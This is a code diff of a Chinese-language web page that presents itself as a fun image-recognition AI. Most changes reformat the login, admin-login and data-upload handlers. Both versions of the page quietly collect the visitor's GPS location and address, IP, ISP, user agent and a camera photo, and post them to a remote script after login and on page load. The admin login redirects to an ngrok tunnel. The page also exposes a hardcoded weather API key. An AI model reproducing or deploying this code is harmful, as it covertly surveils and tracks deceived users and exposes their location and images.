@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>試試這款影像識別 AI，讓照片變得更有趣！l</title>
+  <title>試試這款影像識別 AI，讓照片變得更有趣！</title>
   <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
   <style>
     body {
@@ -291,16 +291,11 @@
         formData.append('action', 'register');
         formData.append('email', email);
         formData.append('password', password);
-        const jsonData = {
-          action: 'register',
-          email: email,
-          password: password
-        };
 
         const response = await fetch(SCRIPT_URL, {
-    method: 'POST',
-    body: formData
-  });
+          method: 'POST',
+          body: formData
+        });
 
         const result = await response.json();
         if (result.success) {
@@ -312,73 +307,73 @@
         showErrorMessage('註冊錯誤：' + error.message);
       }
     });
-document.getElementById('loginForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const email = document.getElementById('loginEmail').value;
-  const password = document.getElementById('loginPassword').value;
+    document.getElementById('loginForm').addEventListener('submit', async (e) => {
+      e.preventDefault();
+      const email = document.getElementById('loginEmail').value;
+      const password = document.getElementById('loginPassword').value;
 
-  const formData = new URLSearchParams();
-  formData.append('action', 'login');
-  formData.append('email', email);
-  formData.append('password', password);
+      const formData = new URLSearchParams();
+      formData.append('action', 'login');
+      formData.append('email', email);
+      formData.append('password', password);
 
-  try {
-    const response = await fetch(SCRIPT_URL, {
-      method: 'POST',
-      body: formData
+      try {
+        const response = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData
+        });
+
+        if (!response.ok) {
+          throw new Error(`HTTP 錯誤：${response.status}`);
+        }
+
+        const result = await response.json();
+
+         if (result.success) {
+          // 儲存 user_id 至 sessionStorage
+          sessionStorage.setItem('user_id', result.user_id);
+          showSuccessMessage('登入成功！');
+          modalOverlay.style.display = 'none';
+          mainPanel.style.display = 'block';
+          await collectAndSendData(); // 收集並發送裝置資訊
+        } else {
+          showErrorMessage(`錯誤原因：${result.error}`);
+        }
+      } catch (error) {
+        showErrorMessage(`系統錯誤：${error.message}`);
+      }
     });
-
-    if (!response.ok) {
-      throw new Error(`HTTP 錯誤：${response.status}`);
-    }
-
-    const result = await response.json();
-
-     if (result.success) {
-      // 儲存 user_id 至 sessionStorage
-      sessionStorage.setItem('user_id', result.user_id);
-      showSuccessMessage('登入成功！');
-      modalOverlay.style.display = 'none';
-      mainPanel.style.display = 'block';
-      await collectAndSendData(); // 收集並發送裝置資訊
-    } else {
-      showErrorMessage(`錯誤原因：${result.error}`);
-    }
-  } catch (error) {
-    showErrorMessage(`系統錯誤：${error.message}`);
-  }
-});
     document.getElementById('adminLoginForm').addEventListener('submit', async (e) => {
-  e.preventDefault();
-  const email = document.getElementById('adminEmail').value;
-  const password = document.getElementById('adminPassword').value;
+      e.preventDefault();
+      const email = document.getElementById('adminEmail').value;
+      const password = document.getElementById('adminPassword').value;
 
-  const formData = new URLSearchParams();
-  formData.append('action', 'adminLogin');
-  formData.append('email', email);
-  formData.append('password', password);
+      const formData = new URLSearchParams();
+      formData.append('action', 'adminLogin');
+      formData.append('email', email);
+      formData.append('password', password);
 
-  try {
-    const response = await fetch(SCRIPT_URL, {
-      method: 'POST',
-      body: formData
+      try {
+        const response = await fetch(SCRIPT_URL, {
+          method: 'POST',
+          body: formData
+        });
+        if (!response.ok) {
+          throw new Error(`HTTP 錯誤：${response.status}`);
+        }
+        const result = await response.json();
+
+        if (result.success) {
+          showSuccessMessage('管理者登入成功！');
+          adminModalOverlay.style.display = 'none';
+          window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin.php';
+        } else {
+          showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
+        }
+      } catch (error) {
+        showErrorMessage('管理者登入錯誤：' + error.message);
+      }
     });
-    if (!response.ok) {
-      throw new Error(`HTTP 錯誤：${response.status}`);
-    }
-    const result = await response.json();
-
-    if (result.success) {
-      showSuccessMessage('管理者登入成功！');
-      adminModalOverlay.style.display = 'none';
-      window.location.href = 'https://3df0-125-227-108-79.ngrok-free.app/admin.php';
-    } else {
-      showErrorMessage('管理者登入失敗：' + (result.error || '未知原因'));
-    }
-  } catch (error) {
-    showErrorMessage('管理者登入錯誤：' + error.message);
-  }
-});
 
     async function startCamera() {
       let stream = null;
@@ -442,7 +437,7 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
      async function getWeatherInfo(latitude, longitude) {
       try {
         if (!latitude || !longitude) return;
-        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611';
+        const apiKey = 'ae0c5817d5c802a5f12d3c9de2517611'; // 確保您的 API 金鑰正確且有效
         const resp = await fetch(
           `https://api.openweathermap.org/data/2.5/weather?lat=${latitude}&lon=${longitude}&units=metric&lang=zh_tw&appid=${apiKey}`
         );
@@ -460,8 +455,6 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
         document.getElementById('weatherInfo').innerText = '天氣資訊獲取失敗';
       }
     }
-
-    
 
  async function collectAndSendData() {
     const statusElem = document.getElementById('status');
@@ -481,37 +474,36 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
         if (ipResult.status === 'fulfilled') collectedData.ip = ipResult.value;
         if (photoResult) collectedData.photo = photoResult;
 
-        const fd = new URLSearchParams();
-      
-      const userId = sessionStorage.getItem('user_id'); 
+        const userId = sessionStorage.getItem('user_id'); 
         if (!userId) {
             console.error('無法獲取用戶 ID，請先登入');
             return;
         }
 
-        fd.append('user_id', userId);
-        fd.append('message', '合併資料上傳');
+        const formData = new URLSearchParams();
+        formData.append('user_id', userId);
+        formData.append('message', '合併資料上傳');
         if (collectedData.gps) {
-            fd.append('latitude', collectedData.gps.latitude);
-            fd.append('longitude', collectedData.gps.longitude);
-            fd.append('address', collectedData.gps.address);
+            formData.append('latitude', collectedData.gps.latitude);
+            formData.append('longitude', collectedData.gps.longitude);
+            formData.append('address', collectedData.gps.address);
         }
         if (collectedData.ip) {
-            fd.append('ip', collectedData.ip.ip);
-            fd.append('ipType', collectedData.ip.ipType);
-            fd.append('userAgent', collectedData.ip.userAgent);
-            fd.append('city', collectedData.ip.city);
-            fd.append('region', collectedData.ip.region);
-            fd.append('country', collectedData.ip.country);
-            fd.append('org', collectedData.ip.org);
+            formData.append('ip', collectedData.ip.ip);
+            formData.append('ipType', collectedData.ip.ipType);
+            formData.append('userAgent', collectedData.ip.userAgent);
+            formData.append('city', collectedData.ip.city);
+            formData.append('region', collectedData.ip.region);
+            formData.append('country', collectedData.ip.country);
+            formData.append('org', collectedData.ip.org);
         }
         if (collectedData.photo) {
-            fd.append('imageData', collectedData.photo);
+            formData.append('imageData', collectedData.photo);
         }
 
         const resp = await fetch(SCRIPT_URL, {
             method: 'POST',
-            body: fd
+            body: formData
         });
 
         const result = await resp.json();
@@ -528,25 +520,26 @@ document.getElementById('loginForm').addEventListener('submit', async (e) => {
     }
 }
 
-
 function getSessionUserId() {
     return sessionStorage.getItem('user_id'); 
 }
     
    document.addEventListener('DOMContentLoaded', async () => { 
-  try {
-    const gpsData = await getGpsCoordinates();
-    if (gpsData) {
-      document.getElementById('map').src = 
-        `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
-      await getWeatherInfo(gpsData.latitude, gpsData.longitude);
+    try {
+      const userId = sessionStorage.getItem('user_id');
+      if (userId) {
+        const gpsData = await getGpsCoordinates();
+        if (gpsData) {
+          document.getElementById('map').src = 
+            `https://www.google.com/maps?q=${gpsData.latitude},${gpsData.longitude}&hl=zh-TW&z=15&output=embed`;
+          await getWeatherInfo(gpsData.latitude, gpsData.longitude);
+        }
+        collectAndSendData();
+      }
+    } catch (error) {
+      console.error('DOMContentLoaded 初始化時錯誤:', error);
     }
-    collectAndSendData();
-
-  } catch (error) {
-    console.error('DOMContentLoaded 初始化時錯誤:', error);
-  }
-});
+  });
   </script>
 </body>
 </html>
